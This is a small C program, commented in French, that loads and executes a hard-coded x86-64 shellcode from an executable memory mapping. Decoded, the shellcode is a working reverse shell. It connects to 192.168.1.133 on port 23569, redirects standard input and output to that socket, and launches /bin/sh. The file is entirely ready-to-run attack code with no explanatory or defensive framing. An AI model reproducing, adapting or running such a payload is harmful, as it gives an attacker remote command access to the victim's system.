#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>



int main() {
unsigned char shellcode[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xff\x48\x31\xf6\xb0\x29\x40\xb7\x02\x40\xb6\x01\x40\xb2\x06\x0f\x05\x49\x89\xc0\x48\x83\xec\x08\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x5c\x11\xc7\x44\x24\x04\xc0\xa8\x01\x85\x48\x89\xe6\xb2\x10\x41\x50\x41\x58\xb0\x2a\x0f\x05\xb0\x21\x41\x50\x41\x58\x48\x31\xf6\x0f\x05\xb0\x21\x41\x50\x41\x58\x40\xb6\x01\x0f\x05\xb0\x21\x41\x50\x41\x58\x40\xb6\x02\x0f\x05\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05";
    void *exec_mem;
    int pagesize = sysconf(_SC_PAGE_SIZE);

    // Allouer de la mémoire exécutable
    exec_mem = mmap(NULL, pagesize, PROT_READ | PROT_WRITE | PROT_EXEC, 
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (exec_mem == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    // Copier le shellcode dans la mémoire allouée
    memcpy(exec_mem, shellcode, sizeof(shellcode));

    // Exécuter le shellcode
    ((void(*)())exec_mem)();

    return 0;
}
